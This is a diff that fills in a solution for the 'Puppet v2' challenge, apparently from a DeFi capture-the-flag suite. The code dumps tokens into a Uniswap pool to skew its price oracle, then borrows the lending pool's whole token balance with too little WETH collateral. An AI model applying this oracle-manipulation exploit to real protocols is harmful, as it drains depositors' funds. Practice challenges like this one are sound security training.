@@ -83,6 +83,40 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /**
+         *  amountIn
+            amountOutMin
+            path
+            to
+            deadline
+         */
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2, 
+            {
+                gasLimit: 1000000
+            }
+        )
+        //now in pool has, 10010 token, 0.1 WETH
+        //we have 9.9 WETH, 20 ETH, 0 tokens
+        await weth.connect(player).deposit({
+            value: PLAYER_INITIAL_ETH_BALANCE - (1n * 10n ** 17n)
+        });
+
+        //check WETH balance
+        const wethBalance = await weth.balanceOf(player.address)
+        console.log('wethBalance: ', wethBalance.div(10n ** 15n))
+
+        const expectedDepositAmount = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log('expectedDepositAmount', expectedDepositAmount.div(10n ** 15n))
+
+        await weth.connect(player).approve(lendingPool.address, expectedDepositAmount)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
+
     });
 
     after(async function () {
